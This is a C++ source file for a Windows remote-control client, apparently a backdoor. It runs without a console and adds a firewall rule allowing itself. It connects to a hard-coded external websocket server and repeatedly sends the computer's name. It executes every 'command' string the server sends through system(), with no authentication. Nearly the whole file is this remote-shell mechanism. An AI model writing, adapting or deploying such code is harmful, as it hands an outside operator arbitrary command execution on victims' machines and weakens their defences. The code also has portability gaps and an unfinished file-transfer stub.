#include <iostream>
#include <fstream>
#include <string>
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>
#include <nlohmann/json.hpp>
#include <filesystem>
#include <exception>

using json = nlohmann::json;
using namespace std;
namespace fs = filesystem;


#ifdef _WIN32
    #include <Windows.h>
#else
    #include <unistd.h>
#endif

string getComputerName() {
    char name[256];
#ifdef _WIN32
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name);
    }
#else
    if (gethostname(name, sizeof(name)) == 0) {
        return std::string(name);
    }
#endif
    return "Unknown";
}


string getExePath(){
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL,buffer,MAX_PATH);
    return string(buffer);
}


void ErrorNotiffication(const char* message){
    char buffer[255];
    MessageBoxA(NULL,message, "IN FILE EYE" ,MB_ICONERROR | MB_OK);
}

atomic<bool> shouldReconnect(true);
atomic<bool> isConnected(false);
ix::WebSocket webSocket;


void startWebSocket(const string& BASE_URL, const string& pc_name) {
    webSocket.setUrl(BASE_URL);
    
    ix::SocketTLSOptions tlsOptions;
    tlsOptions.tls = true;
    webSocket.setTLSOptions(tlsOptions);

    webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Open) {
            isConnected = true;
            cout << "[+] Connected to server\n";
        }
        else if (msg->type == ix::WebSocketMessageType::Close) {
            isConnected = false;
            shouldReconnect = true;
            cout << "[-] Disconnected from server\n";
        }
        else if (msg->type == ix::WebSocketMessageType::Error) {
            isConnected = false;
            shouldReconnect = true;
            cout << "[!] WebSocket error: " << msg->errorInfo.reason << endl;
        }
        else if (msg->type == ix::WebSocketMessageType::Message) {
            try {
                json data = json::parse(msg->str);
                string type = data["type"];

                if (type == "command") {
                    string text = data["text"];
                    system(text.c_str());
                }
                else if (type == "file") {
                    string filename = data["filename"];
                    // handle file download/save
                }
            }
            catch (exception& e) {
                cout << "[!] JSON parse error: " << e.what() << endl;
            }
        }
    });

    webSocket.start();

    // Отправляем имя ПК после подключения
    thread([pc_name]() {
        json send_data;
        send_data["name"] = pc_name;

        while (true) {
            if (isConnected) {
                webSocket.send(send_data.dump());
                this_thread::sleep_for(std::chrono::seconds(5));
            } else {
                this_thread::sleep_for(std::chrono::seconds(1));
            }
        }
    }).detach();
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
// int main()
{
    ix::initNetSystem();

    string pc_name = getComputerName();
    string BASE_URL = "wss://pccontrolbackend.onrender.com/openC";

    // Настройка брандмауэра
    string command_netsh = "netsh advfirewall firewall add rule name=\"Eye rule\" dir=in action=allow program=\"" + getExePath() + "\" enable=yes profile=public";
    system(command_netsh.c_str());

    // Цикл автоматического переподключения
    while (true) {
        if (shouldReconnect) {
            webSocket.stop();  // На всякий случай
            cout << "[*] Trying to reconnect...\n";
            startWebSocket(BASE_URL, pc_name);
            shouldReconnect = false;
        }

        this_thread::sleep_for(std::chrono::seconds(5));
    }

    ix::uninitNetSystem();
    return 0;
}
